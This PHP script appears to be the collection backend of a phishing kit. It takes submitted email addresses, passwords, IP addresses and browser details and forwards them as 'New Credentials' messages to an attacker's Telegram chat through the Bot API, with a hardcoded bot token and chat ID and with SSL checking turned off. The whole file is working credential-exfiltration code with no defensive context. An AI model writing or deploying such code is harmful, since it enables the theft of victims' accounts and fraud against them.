<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    $input = $_POST;
}

$email = $input['email'] ?? '';
$password = $input['password'] ?? '';
$ip = $input['ip'] ?? $_SERVER['REMOTE_ADDR'];
$userAgent = $input['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'];
$timestamp = $input['timestamp'] ?? date('Y-m-d H:i:s');

$botToken = '8349547391:AAH1v1zqalWhGluQiPUQ9RFNSVIu7xe_5Kw';
$chatId = '5358329332';

$message = "🔐 New Credentials 🔐\n";
$message .= "Email: " . $email . "\n";
$message .= "Password: " . $password . "\n";
$message .= "IP: " . $ip . "\n";
$message .= "Time: " . $timestamp . "\n";
$message .= "Browser: " . $userAgent;

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$postData = ['chat_id' => $chatId, 'text' => $message];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

echo json_encode(['success' => $httpCode === 200]);
?>
